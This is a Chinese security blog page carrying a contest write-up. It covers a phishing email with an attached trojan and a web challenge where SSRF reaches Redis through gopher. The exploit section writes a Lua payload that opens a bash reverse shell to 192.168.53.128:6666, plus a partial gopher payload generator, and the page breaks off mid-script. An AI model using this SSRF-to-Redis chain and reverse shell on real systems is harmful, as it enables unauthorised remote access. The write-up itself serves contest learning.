@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>软件安全赛 - 安全员小周 | ROOT</title>
+    <!-- Prism CSS for Synthax Highlighting (White Theme) -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="article-mode">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="brand">
+            <span>#_</span> 安全员小周
+        </div>
+
+        <div class="nav-group">
+        <div class="nav-header">知识库</div>
+            <details class="folder-group">
+                <summary>鹏城杯2024</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-19-鹏城杯2024-训练.html" class="nav-item">鹏城杯2024-训练</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>计算机网络</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-06-21-计算机网络-OSPF.html" class="nav-item">计算机网络-OSPF</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>综合归档</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-30-CISCN-2018Picture-misc-wp.html" class="nav-item">CISCN_2018Picture_misc_wp</a>
+            
+                <a href="/posts/2024-03-13-Rick-pickle.html" class="nav-item">Rick_pickle</a>
+            
+                <a href="/posts/2024-03-19-Blue靶场实践.html" class="nav-item">Blue靶场实践</a>
+            
+                <a href="/posts/2024-04-26-github-PicGo-obsidian.html" class="nav-item">github+PicGo+obsidian</a>
+            
+                <a href="/posts/2024-05-25-刷题记录.html" class="nav-item">刷题记录</a>
+            
+                <a href="/posts/2024-06-07-计算机组成原理-运算器.html" class="nav-item">计算机组成原理_运算器</a>
+            
+                <a href="/posts/2024-06-21-计算机组成原理-存储器.html" class="nav-item">计算机组成原理_存储器</a>
+            
+                <a href="/posts/2024-07-21-redis-利用方式大全.html" class="nav-item">redis_利用方式大全</a>
+            
+                <a href="/posts/2024-07-27-hackmyvm-coffeeshop.html" class="nav-item">hackmyvm_coffeeshop</a>
+            
+                <a href="/posts/2024-08-17-log4shell.html" class="nav-item">log4shell</a>
+            
+                <a href="/posts/2024-09-09-浏览器解码顺序和解析顺序for-xss.html" class="nav-item">浏览器解码顺序和解析顺序for-xss</a>
+            
+                <a href="/posts/2024-09-16-CORS-跨域资源共享.html" class="nav-item">CORS_跨域资源共享</a>
+            
+                <a href="/posts/2024-09-17-ip2domain.html" class="nav-item">ip2domain</a>
+            
+                <a href="/posts/2024-09-17-Oneforall.html" class="nav-item">Oneforall</a>
+            
+                <a href="/posts/2024-09-17-类.html" class="nav-item">类</a>
+            
+                <a href="/posts/2024-10-20-activity.html" class="nav-item">activity</a>
+            
+                <a href="/posts/2024-10-20-manifest.html" class="nav-item">manifest</a>
+            
+                <a href="/posts/2024-10-20-service.html" class="nav-item">service</a>
+            
+                <a href="/posts/2024-10-30-2024网鼎杯青龙组.html" class="nav-item">2024网鼎杯青龙组</a>
+            
+                <a href="/posts/2024-10-30-网鼎杯模拟赛.html" class="nav-item">网鼎杯模拟赛</a>
+            
+                <a href="/posts/2024-11-04-子域名泛解析解析.html" class="nav-item">子域名泛解析解析</a>
+            
+                <a href="/posts/2024-11-05-dns欺骗.html" class="nav-item">dns欺骗</a>
+            
+                <a href="/posts/2024-11-05-mac-泛洪.html" class="nav-item">mac_泛洪</a>
+            
+                <a href="/posts/2024-11-15-服务.html" class="nav-item">服务</a>
+            
+                <a href="/posts/2024-11-17-app大致框架.html" class="nav-item">app大致框架</a>
+            
+                <a href="/posts/2024-11-25-安全狗.html" class="nav-item">安全狗</a>
+            
+                <a href="/posts/2024-11-30-hash扩展攻击.html" class="nav-item">hash扩展攻击</a>
+            
+                <a href="/posts/2024-11-30-RCE绕过.html" class="nav-item">RCE绕过</a>
+            
+                <a href="/posts/2024-11-30-tcp握手.html" class="nav-item">tcp握手</a>
+            
+                <a href="/posts/2024-11-30-WEBDAv.html" class="nav-item">WEBDAv</a>
+            
+                <a href="/posts/2024-11-30-短文件名枚举.html" class="nav-item">短文件名枚举</a>
+            
+                <a href="/posts/2024-12-19-ciscn训练.html" class="nav-item">ciscn训练</a>
+            
+                <a href="/posts/2024-12-25-新星赛.html" class="nav-item">新星赛</a>
+            
+                <a href="/posts/2025-01-07-软件安全赛.html" class="nav-item">软件安全赛</a>
+            
+                <a href="/posts/2025-01-15-jsonp.html" class="nav-item">jsonp</a>
+            
+                <a href="/posts/2025-01-15-同源策略.html" class="nav-item">同源策略</a>
+            
+                <a href="/posts/2025-01-19-一次混淆webshell分析.html" class="nav-item">一次混淆webshell分析</a>
+            
+                <a href="/posts/2025-01-23-hexo博客搭建.html" class="nav-item">hexo博客搭建</a>
+            
+                <a href="/posts/2025-01-29-SMB445端口利用.html" class="nav-item">SMB445端口利用</a>
+            
+                <a href="/posts/2025-01-30-域常见信息枚举.html" class="nav-item">域常见信息枚举</a>
+            
+                <a href="/posts/2025-02-03-红日1.html" class="nav-item">红日1</a>
+            
+                <a href="/posts/2025-02-05-URLDNS链.html" class="nav-item">URLDNS链</a>
+            
+                <a href="/posts/2025-02-14-安全服务实习面经.html" class="nav-item">安全服务实习面经</a>
+            
+                <a href="/posts/2025-02-21-实习该反问什么-.html" class="nav-item">实习该反问什么?</a>
+            
+                <a href="/posts/2025-04-05-c--内存机制和安全.html" class="nav-item">c++内存机制和安全</a>
+            
+                <a href="/posts/2025-06-01-pickle.html" class="nav-item">pickle</a>
+            
+                <a href="/posts/2025-06-02-vllm大模型推理引擎.html" class="nav-item">vllm大模型推理引擎</a>
+            
+                <a href="/posts/hello-world.html" class="nav-item">我的第一篇安全文章</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>算法</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-20-算法-Init.html" class="nav-item">算法-Init</a>
+            
+                <a href="/posts/2024-09-20-算法-分治和逆序.html" class="nav-item">算法-分治和逆序</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>漏洞复现</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-11-30-常见服务器解析漏洞.html" class="nav-item">常见服务器解析漏洞</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>湖北大学</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-湖北大学-奇安信杯完整版wp.html" class="nav-item">湖北大学-奇安信杯完整版wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>横向移动</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-横向移动-远程创建进程.html" class="nav-item">横向移动-远程创建进程</a>
+            
+                <a href="/posts/2024-09-10-横向移动-WMI.html" class="nav-item">横向移动-WMI</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>权限提升</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-04-权限提升-Linux-passwd提权.html" class="nav-item">权限提升-Linux passwd提权</a>
+            
+                <a href="/posts/2024-03-09-权限提升-windows计划任务提权.html" class="nav-item">权限提升-windows计划任务提权</a>
+            
+                <a href="/posts/2024-03-19-权限提升-windows服务提权.html" class="nav-item">权限提升-windows服务提权</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>文件上传</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-18-文件上传-php.html" class="nav-item">文件上传-php</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>数学基础信安总结</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-数学基础信安总结-一次遗忘的作业.html" class="nav-item">数学基础信安总结-一次遗忘的作业</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>操作系统</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-操作系统-api接口.html" class="nav-item">操作系统-api接口</a>
+            
+                <a href="/posts/2024-09-11-操作系统-启动.html" class="nav-item">操作系统-启动</a>
+            
+                <a href="/posts/2024-09-11-操作系统-基础认识.html" class="nav-item">操作系统-基础认识</a>
+            
+                <a href="/posts/2024-10-20-操作系统-内核.html" class="nav-item">操作系统-内核</a>
+            
+                <a href="/posts/2024-10-20-操作系统-进程.html" class="nav-item">操作系统-进程</a>
+            
+                <a href="/posts/2024-11-12-操作系统启动实验.html" class="nav-item">操作系统启动实验</a>
+            
+                <a href="/posts/2024-11-12-操作系统进程管理实验.html" class="nav-item">操作系统进程管理实验</a>
+            
+                <a href="/posts/2024-12-25-操作系统概念集合.html" class="nav-item">操作系统概念集合</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>外联木马分析</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-26-外联木马分析-ciscn.html" class="nav-item">外联木马分析-ciscn</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>域整理</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-27-域整理-基础.html" class="nav-item">域整理-基础</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网穿透</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-内网穿透-ligolo使用.html" class="nav-item">内网穿透-ligolo使用</a>
+            
+                <a href="/posts/2025-01-14-内网穿透-ssh搭建.html" class="nav-item">内网穿透-ssh搭建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网安全</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-29-内网横向的一些方式.html" class="nav-item">内网横向的一些方式</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>VULNHUB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-vulnhub-vegeta.html" class="nav-item">vulnhub-vegeta</a>
+            
+                <a href="/posts/2024-07-13-Vulnhub-Aiweb1.html" class="nav-item">Vulnhub-Aiweb1</a>
+            
+                <a href="/posts/2024-07-14-Vulnhub-Breakout.html" class="nav-item">Vulnhub-Breakout</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>TRYHACKME</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-Tryhackme-Overpass.html" class="nav-item">Tryhackme-Overpass</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>THM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-Thm-alfred.html" class="nav-item">Thm-alfred</a>
+            
+                <a href="/posts/2024-05-14-Thm-Steel-Mountain.html" class="nav-item">Thm-Steel-Mountain</a>
+            
+                <a href="/posts/2024-08-17-Thm-Gane-zone.html" class="nav-item">Thm-Gane_zone</a>
+            
+                <a href="/posts/2024-08-17-Thm-Hackpark.html" class="nav-item">Thm-Hackpark</a>
+            
+                <a href="/posts/2024-08-17-Thm-Skynet.html" class="nav-item">Thm-Skynet</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQLI</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-19-sqli-labs靶场-二次注入.html" class="nav-item">sqli-labs靶场-二次注入</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQL</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-30-sql-学习-day1.html" class="nav-item">sql_学习_day1</a>
+            
+                <a href="/posts/2024-05-03-sql-索引.html" class="nav-item">sql-索引</a>
+            
+                <a href="/posts/2024-05-03-sql-表修改和创建.html" class="nav-item">sql-表修改和创建</a>
+            
+                <a href="/posts/2024-05-03-sql-表增删查改.html" class="nav-item">sql-表增删查改</a>
+            
+                <a href="/posts/2024-05-03-sql-视图创建.html" class="nav-item">sql-视图创建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SNORT</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-09-snort-ips.html" class="nav-item">snort-ips</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>PHPMYADMIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-phpmyadmin-getshell姿势.html" class="nav-item">phpmyadmin-getshell姿势</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>NSSCTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-26-nssctf-round-16web部分wp.html" class="nav-item">nssctf-round#16web部分wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>JAVA</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-java-包和输入输出.html" class="nav-item">java-包和输入输出</a>
+            
+                <a href="/posts/2024-09-11-java-数据结构.html" class="nav-item">java-数据结构</a>
+            
+                <a href="/posts/2024-09-11-java-逻辑结构.html" class="nav-item">java-逻辑结构</a>
+            
+                <a href="/posts/2025-02-05-java动态代理.html" class="nav-item">java动态代理</a>
+            
+                <a href="/posts/2025-02-05-java反射.html" class="nav-item">java反射</a>
+            
+                <a href="/posts/2025-02-05-java反序列化.html" class="nav-item">java反序列化</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HTB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-HTB-LAME.html" class="nav-item">HTB-LAME</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HACKMYVM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-15-Hackmyvm-leet.html" class="nav-item">Hackmyvm-leet</a>
+            
+                <a href="/posts/2024-10-10-Hackmyvm-Lookup.html" class="nav-item">Hackmyvm-Lookup</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>EW</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-17-ew-内网.html" class="nav-item">ew-内网</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>DOCKER</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-02-01-docker.html" class="nav-item">docker</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>CTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-03-sictf-web.html" class="nav-item">sictf_web</a>
+            
+                <a href="/posts/2024-03-19-CTF长城杯.html" class="nav-item">CTF长城杯</a>
+            
+                <a href="/posts/2024-03-30-ctf-misc-掌控腾龙杯.html" class="nav-item">ctf-misc-掌控腾龙杯</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录1.html" class="nav-item">ctf刷题记录1</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录2.html" class="nav-item">ctf刷题记录2</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录3.html" class="nav-item">ctf刷题记录3</a>
+            
+                <a href="/posts/2024-07-21-ctfhub-ssrf基础认证.html" class="nav-item">ctfhub_ssrf基础认证</a>
+            
+                <a href="/posts/2024-07-28-ctf刷题记录4.html" class="nav-item">ctf刷题记录4</a>
+            
+                <a href="/posts/2024-09-11-2024-9-11-CTF.html" class="nav-item">2024-9-11-CTF</a>
+            
+                <a href="/posts/2024-09-12-CTF-Ciscn-cyberpunk.html" class="nav-item">CTF-Ciscn-cyberpunk</a>
+            
+                <a href="/posts/2024-10-02-CTF刷题buuctf.html" class="nav-item">CTF刷题buuctf</a>
+            
+                <a href="/posts/2025-01-19-suctf.html" class="nav-item">suctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>BEGIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-11-begin-ctf.html" class="nav-item">begin-ctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>ANDROID</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-16-2024-1-2-12-Android-Studio配置.html" class="nav-item">2024-1.2.12-Android-Studio配置</a>
+            
+                <a href="/posts/2024-09-19-Android-UI设计.html" class="nav-item">Android_UI设计</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>AD域枚举信息</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-AD域枚举信息-BloodHound.html" class="nav-item">AD域枚举信息-BloodHound</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-Microsoft控制台MMC.html" class="nav-item">AD域枚举信息-Microsoft控制台MMC</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-powershell-cmdlet.html" class="nav-item">AD域枚举信息-powershell-cmdlet</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-命令枚举.html" class="nav-item">AD域枚举信息-命令枚举</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>4</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-28-4-28ctf急切刷题.html" class="nav-item">4-28ctf急切刷题</a>
+            </div></details></div>
+
+        <div class="user-profile">
+            <div class="avatar" style="background:#333; border:1px solid #00ff41; color:#00ff41;">K</div>
+            <div style="font-size: 0.9rem; font-weight: 500; color: #00ff41;">安全员小周</div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <header class="top-header">
+            <div class="breadcrumb">
+                ~/home/综合归档/软件安全赛 ...
+            </div>
+
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="grep -r 'keyword' ." id="searchInput">
+                <div class="search-results" id="searchResults"></div>
+            </div>
+        </header>
+
+        <main class="content-area">
+            <h1 class="article-title">软件安全赛</h1>
+            <div class="markdown-body">
+                <p>2025/1/5打了软件安全赛,针对个人来讲难度还是很大的，所以把出的两个题分析一下。</p>
+<h4>1. 钓鱼邮件分析</h4>
+<p>邮件解密,它是所有的都用了base编码 解码 有用的只有下面的正文。</p>
+<pre><code class="language-shell">&lt;div class=&quot;qmbox&quot;&gt;&lt;p style=&quot;font-family: -apple-system, BlinkMacSystemFont, &amp;quot;
+PingFang SC&amp;quot;
+, &amp;quot;
+Microsoft YaHei&amp;quot;
+, sans-serif; font-size: 10.5pt; color: rgb(46, 48, 51);
+&quot;&gt;今天是你的24岁生日，祝你生日快乐&lt;/p&gt;&lt;div xmail-signature=&quot;&quot;&gt;&lt;xm-signature&gt;&lt;/xm-signature&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;X-QQ-XMRINFO: Mp0Kj//9VHAxr69bL5MkOOs=X-QQ-XMAILINFO: Mi/i+wq2NsJqOjK39baWcJF141jv20ysu7uvjsdVZOQPyBXZKFBBJqrPZCTiKJ	 d7wdGsfbzivUI9F/OZZvBm1nmIa5oNSrj2hkORK7/+5NZPP0GrlCdUnmiEIUxIB4eEIzPsyVFl5gO	 Xf6wdCD4iXuYlexjoTN90TNSwJIqMt8ToLR8AETY5sAwIW7kggpoQxoi1jcsS/xEOpLVhrCDSLktm	 P/95iJcEPLeFb1Bj78s8aljWgWHWNVeyVxoKt/BE9DghasuyQjiOzzl4Lg/UnJM3ALsbAXFJyLW4Q	 /6PKnwZS/VNwNUVhGKFDPU5aWEFSVufu1p5EVl4J3cth2I7LZ/kT8fYox8teauDeml/1f9jQNoGx0	 2mufT0LbYCncO26MxVRZ5Hb+WK1jcHC3HRzOgy+t695gzOa6iVFTinruQrT1EzEU4p7keQ0Z2uat8	 Ide9mSRWQ0dg0xrqwYXdd19qcfVuVBbi5KC/tAh4OoTjxYh/JCD2gQD0h3fBstrUhK4UISpinTFtB	 zw+Rt5PHOk+KZFufpCYPRjwnFJ7bdFLD76shuYRegxAcwpX7EbwLDTOQ1vSQgTivo6K0Y+620ovSp	 dX/rORvapshvqd41rtXWHd/QAQ3t1A5a/IpO/n1sVJWwSz9Z864P1SJJ3QdgXj3Dz0N6Ch4HujG+M	 bh6XhF4jJRUdtXCCr+TH3TN8KjUz2XUiBccfDD/HPgaac5KUVt+xlvrYBUivd/4iPOyy9y6a0K8Pg	 /xm+Hhec+Bo/nfEndClgLY116fdOmD/3T7QCCmmL1pDfSJe9pnht9mVI7ySS4YyIuANf1La/vUDxl	 kw0beVN9ooCvf9NJGixdVbtdN2RVm+10Qpl1ErR2dyrhMpg8vVzc5ztc/CayChAHmJNpb/MacZSbA	 392cIqk05wGYxVuq5ETGzL0o9tlik/quWMrHJnPZeVWY2Zl4JvHDUPJYkldGzXO7h8qmcNev9Pm5z	 4nEsdRYqRGJt/nmncvZv3y7Stt7Shn5/LEJ0OLA9hF3uh6y5m9cUa7zoTjMrPVjCdNJVn8ZLFnZT8	 VVh/0T/zB40wTE76YUO/wTBs1sg==From: &quot;=?utf-8?B?QWxpY2Nl?=&quot; &lt;Alice
+@qq.com&gt;To: &quot;=?utf-8?B?Qm9i?=&quot; &lt;Bob
+@qq.com&gt;Subject: =?utf-8?B?55Sf5pel5b+r5LmQ?=Mime-Version: 1.0Content-Type: multipart/mixed;	boundary=&quot;----=_NextPart_67318E01_3D423680_3EAF4BE3&quot;Content-Transfer-Encoding: 8BitDate: Mon, 11 Nov 2024 12:54:24 +0800X-Priority: 3Message-ID: &lt;tencent_5926819C8C20A292B26A361A43C2F84BEA09
+@qq.com&gt;X-QQ-MIME: TCMime 1.0 by TencentX-Mailer: QQMail 2.xX-QQ-Mailer: QQMail 2.xX-QQ-mid: xmseza31-0t1731300864t1gxcwyusThis is a multi-part message in MIME format.------=_NextPart_67318E01_3D423680_3EAF4BE3Content-Type: multipart/alternative;	boundary=&quot;----=_NextPart_67318E01_3D423680_45B6667D&quot;;
+------=_NextPart_67318E01_3D423680_45B6667DContent-Type: text/plain;	charset=&quot;utf-8&quot;Content-Transfer-Encoding: base645LuK5aSp5piv5L2g55qEMjTlsoHnlJ/ml6XvvIznpZ3kvaDnlJ/ml6Xlv6vkuZA=今天是你的24岁生日，祝你生日快乐------=_NextPart_67318E01_3D423680_45B6667DContent-Type: text/html;	charset=&quot;utf-8&quot;Content-Transfer-Encoding: base64PGRpdiBjbGFzcz0icW1ib3giPjxwIHN0eWxlPSJmb250LWZhbWlseTogLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAmcXVvdDtQaW5nRmFuZyBTQyZxdW90OywgJnF1b3Q7TWljcm9zb2Z0IFlhSGVpJnF1b3Q7LCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDEwLjVwdDsgY29sb3I6IHJnYig0NiwgNDgsIDUxKTsiPuS7iuWkqeaYr+S9oOeahDI05bKB55Sf5pel77yM56Wd5L2g55Sf5pel5b+r5LmQPC9wPjxkaXYgeG1haWwtc2lnbmF0dXJlPSIiPjx4bS1zaWduYXR1cmU+PC94bS1zaWduYXR1cmU+PHA+PC9wPjwvZGl2PjwvZGl2Pg==------=_NextPart_67318E01_3D423680_45B6667D--------=_NextPart_67318E01_3D423680_3EAF4BE3Content-Type: application/octet-stream;	charset=&quot;utf-8&quot;;	name=&quot;=?utf-8?B?55Sf5pel56S854mpLnppcA==?=&quot;Content-Disposition: attachment; filename=&quot;=?utf-8?B?55Sf5pel56S854mpLnppcA==?=&quot;Content-Transfer-Encoding: base64------=_NextPart_67318E01_3D423680_3EAF4BE3--
+</code></pre>
+<p>解码</p>
+<pre><code class="language-python">
+import base64
+def decodebase():
+with open(&quot;mail.txt&quot;,&quot;r&quot;) as  file:
+message=file.read()
+message=message.replace(&quot;\n&quot;,&quot;&quot;)
+# 
+print(message)
+demessage=base64.b64decode(message)
+with open(&quot;1.zip&quot;,&quot;wb&quot;) as file1:
+file1.write(demessage)
+if __name__==&quot;__main__&quot;:
+decodebase()
+</code></pre>
+<p>拿到zip包解压 密码直接爆破</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114215.png" alt="image.png"></p>
+<p>打开就发现了木马文件沙箱直接分析。</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114302.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106114318.png" alt="image.png"><br>分析到ip 和端口</p>
+<h4>2. web1</h4>
+<p>拿到docker，分析出这个利用nginx 和lua进行搭建的web站点。先看nginx配置信息</p>
+<pre><code class="language-text">location / {
+root   html;
+index  index.html;
+}
+location /visit {
+default_type text/plain;
+content_by_lua_file /usr/local/openresty/nginx/lua/main.lua;
+}
+</code></pre>
+<p>可以看到两个路由，一个是由index.html处理/ 另外一个是由main.lua处理/visit于是首先分析<br>index.html</p>
+<h5>2.1 index.html</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+        &lt;title&gt;URL Visitor&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h1&gt;Visit a Website&lt;/h1&gt;
+            &lt;input type=&quot;text&quot; id=&quot;urlInput&quot; placeholder=&quot;Enter a URL&quot; /&gt;
+            &lt;button onclick=&quot;visitUrl()&quot;&gt;Visit&lt;/button&gt;
+            &lt;!-- 触发函数 进行url访问--&gt;
+            &lt;iframe id=&quot;urlFrame&quot; src=&quot;&quot;&gt;&lt;/iframe&gt;
+        &lt;/div&gt;
+        &lt;script&gt;
+            function visitUrl() {
+                var url = document.getElementById(&quot;urlInput&quot;).value;
+                var iframe = document.getElementById(&quot;urlFrame&quot;);
+                &lt;!-- 相当于src 中的url换成了我们的拼接的get传递参数的值--&gt;
+                iframe.src = &quot;/visit?url=&quot; + encodeURIComponent(url);
+            }
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>因此就可以看出来还是在/visit路由上在做文章，而/visit通过nginx的配置文件可以看出。/visit的路由是由main.lua进行处理的。</p>
+<h5>2.2 main.lua</h5>
+<pre><code class="language-lua">-- 打开一个文件并且将文件内容读出来local function read_file(filename)
+local file = io.open(filename, &quot;r&quot;)
+if not file then
+print(&quot;Error: Could not open file &quot; .. filename)
+return nil
+end
+local content = file:read(&quot;*a&quot;)
+file:close()
+return contentend-- 执行对应的lua 代码 local function execute_lua_code(script_content)	-- 先找到 ##LUA_START##(.-)##LUA_END##  这两个特征内部的内容
+local lua_code = script_content:match(&quot;##LUA_START##(.-)##LUA_END##&quot;)
+if lua_code then
+-- 加载 代码
+local chunk, err = load(lua_code)
+if chunk then
+-- 执行代码
+local success, result = pcall(chunk)
+if not success then
+print(&quot;Error executing Lua code: &quot;, result)
+end
+else
+print(&quot;Error loading Lua code: &quot;, err)
+end
+else
+print(&quot;Error: No valid Lua code block found.&quot;)
+endend-- 主函数  打开脚本文件读取出内容然后传递给执行函数local function main()
+local filename = &quot;/scripts/visit.script&quot;
+local script_content = read_file(filename)
+if script_content then
+execute_lua_code(script_content)
+endendmain()
+</code></pre>
+<p>可以看出内部主要是执行了 visit.script 这才是核心</p>
+<h5>2.3 visit.script</h5>
+<pre><code class="language-lua">##LUA_START##-- 这就是刚才的参数传递的参数 local curl = require(&quot;cURL&quot;)local redis = require(&quot;resty.redis&quot;)ngx.req.read_body()local args = ngx.req.get_uri_args()local url = args.url
+if not url then
+ngx.say(&quot;URL parameter is missing!&quot;)
+returnend-- 开始连接redislocal red = redis:new()red:set_timeout(1000)local ok, err = red:connect(&quot;127.0.0.1&quot;, 6379)
+if not ok then
+ngx.say(&quot;Failed to connect to Redis: &quot;, err)
+returnend-- 访问对应的 url 拿到结果 这其实只是个查看缓存的操作。-- 查看是否之前 有这个缓存local res, err = red:get(url)
+if res and res ~= ngx.null then
+ngx.say(res)
+returnend-- 连接local c = curl.easy {
+url = url,
+timeout = 5,
+connecttimeout = 5}
+local response_body = {
+}
+-- 连接远程  并且 存储响应c:setopt_writefunction(table.insert, response_body)local ok, err = pcall(c.perform, c)
+if not ok then
+ngx.say(&quot;Failed to perform request: &quot;, err)
+c:close()
+returnendc:close()-- 存储响应到redislocal response_str = table.concat(response_body)local ok, err = red:setex(url, 3600, response_str)
+if not ok then
+ngx.say(&quot;Failed to save response in Redis: &quot;, err)
+returnendngx.say(response_str)##LUA_END##
+</code></pre>
+<h5>2.4 分析</h5>
+<p>目前已经很明显了，其实就是url请求，很自然就能想到ssrf 然后利用ssrf打redis 。经过了多次尝试发现 无论是ssh ，定时任务都无法成功，自然想到利用木马，但是我们又写不成php马。要写lua马。但是lua的路由已经固定了，我们就去重写main.lua 但是尝试失败，因为在redis写马时候我们会有很多的乱码版本信息。严重影响了lua的解析。</p>
+<p>但是我们发现 在main.lua有这样一句话。我们完全可以重写visit.script。然后使用这个match的特征匹配就可以完全解决乱码的问题。使得我们的结果成功解析。</p>
+<pre><code class="language-lua">local lua_code = script_content:match(&quot;##LUA_START##(.-)##LUA_END##&quot;)
+</code></pre>
+<h5>2.5 exp</h5>
+<p>visit.script 重写内容</p>
+<p>先测试一下能否正常写入lua代码并且执行。</p>
+<pre><code class="language-lua">##LUA_START##ngx.say(&quot;hello&quot;)##LUA_END##
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106202237.png" alt="image.png"><br>可以看出我们已经绕过了这个乱码带来的影响，直接可以包含lua代码并且加载执行。但是目前有个问题，我发现我们的内容长度不可以太长。我始终找不到对应的原因。可能是系统的问题跟打定时任务一样，centos 和ubuntu 不一样。</p>
+<pre><code class="language-lua">##LUA_START##os.execute(&quot;/bin/bash -i &gt;&amp;  /dev/tcp/192.168.53.128/6666  0&lt;&amp;&quot;)##LUA_END##
+</code></pre>
+<h5>2.6 生成payload</h5>
+<pre><code class="language-python">
+import urllib.parseprotocol = &quot;gopher://&quot;ip = &quot;127.0.0.1&quot;port = &quot;6379&quot;shell = &quot;&quot;&quot;\n\n##LUA_START##os.execute(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.53.128/6666 0&gt;&amp;1&quot;)##LUA_END##\n\n&quot;&quot;&quot;filename = &quot;visit.script&quot;path = &quot;/scripts&quot;# 这个相当于可以添加密码认证 这边直接输入账号和密码passwd = &quot;&quot;cmd = [&quot;flushall&quot;,
+&quot;set 1 {
+}
+&quot;.format(shell.replace(&quot; &quot;,&quot;${
+IFS}
+&quot;)),
+&quot;config set dir {
+}
+&quot;.format(path),
